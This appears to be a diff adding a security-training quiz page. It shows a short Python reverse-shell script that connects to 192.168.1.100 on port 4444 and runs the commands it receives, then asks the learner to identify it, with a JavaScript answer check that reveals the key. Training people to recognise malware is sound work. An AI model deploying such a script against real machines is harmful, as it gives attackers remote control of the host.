@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Challenge 4</title>
+</head>
+<body style="background:#222; color:white; font-family:monospace; padding:20px;">
+  <h2>Challenge 4: CoffeeScript Gone Bad</h2>
+  <p>This Python script was found running on a compromised machine. What is its primary purpose?</p>
+
+  <pre style="text-align:left; display:inline-block; background:#111; padding:10px; border:1px solid #fff;">
+import socket
+
+s = socket.socket()
+s.connect(("192.168.1.100", 4444))
+
+while True:
+    command = s.recv(1024).decode()
+    if command.lower() == "exit":
+        break
+    output = os.popen(command).read()
+    s.send(output.encode())
+
+s.close()
+  </pre>
+
+  <p>What kind of malicious behavior does this script perform?</p>
+
+  <select id="answer">
+    <option value="">-- Choose an answer --</option>
+    <option value="keylogger">Keylogger</option>
+    <option value="reverse_shell">Reverse Shell</option>
+    <option value="ransomware">Ransomware</option>
+    <option value="port_scanner">Port Scanner</option>
+  </select>
+
+  <button onclick="check()">Submit</button>
+  <p id="result"></p>
+
+  <script>
+    function check() {
+      const val = document.getElementById('answer').value;
+      if (val === 'reverse_shell') {
+        localStorage.setItem('solved-4', true);
+        document.getElementById('result').textContent = "✅ Correct! It opens a reverse shell to 192.168.1.100.";
+      } else {
+        document.getElementById('result').textContent = "❌ Not quite. Think about how it's interacting with another system.";
+      }
+    }
+  </script>
+</body>
+</html>
